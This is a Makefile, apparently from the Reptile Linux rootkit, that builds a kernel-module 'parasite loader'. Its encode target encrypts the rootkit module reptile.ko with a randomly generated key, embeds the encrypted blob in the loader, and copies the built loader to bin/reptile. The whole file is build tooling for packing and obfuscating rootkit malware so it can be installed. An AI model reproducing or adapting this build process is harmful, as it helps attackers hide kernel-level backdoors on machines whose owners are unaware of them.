PARASITE ?= ../reptile.ko
RAND = 0x$(shell openssl rand -hex 4 > /dev/null 2>&1 && openssl rand -hex 4 || cat /dev/urandom | head -c 4 | hexdump '-e"%x"')

all: encode
	$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$$PWD
	cp parasite_loader.ko ../bin/reptile

encode:
	$(MAKE) -C encrypt
	encrypt/encrypt $(PARASITE) $(RAND) > parasite_blob.inc

clean:
	$(MAKE) -C encrypt clean
	$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$$PWD clean
	rm -f parasite_blob.inc
